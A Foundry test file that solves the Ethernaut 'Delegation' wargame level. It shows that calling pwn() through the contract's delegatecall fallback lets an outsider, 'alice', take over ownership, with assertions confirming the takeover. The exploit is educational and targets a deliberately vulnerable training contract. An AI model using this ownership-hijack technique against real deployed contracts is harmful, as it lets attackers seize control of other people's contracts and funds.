// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Delegation.sol";

// call pwn() on Delegate for delegatecall updates the storage in the first slot of Delegation
contract DelegationTest is Test {
    Delegate delegate;
    Delegation delegation;
    address alice;

    function setUp() public {
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
        alice = makeAddr("alice");

        assertEq(delegate.owner(), address(this));
        assertEq(delegation.owner(), address(this));
    }

    function test1() public {
        vm.prank(alice);
        Delegate(address(delegation)).pwn();

        assertResults();
    }

    function test2() public {
        vm.prank(alice);
        address(delegation).call(abi.encodeWithSelector(Delegate.pwn.selector));

        assertResults();
    }

    function assertResults() private {
        assertEq(delegation.owner(), alice);
        assertEq(delegate.owner(), address(this));

        vm.prank(alice);
        delegate.pwn();

        assertEq(delegation.owner(), alice);
        assertEq(delegate.owner(), alice);
    }
}
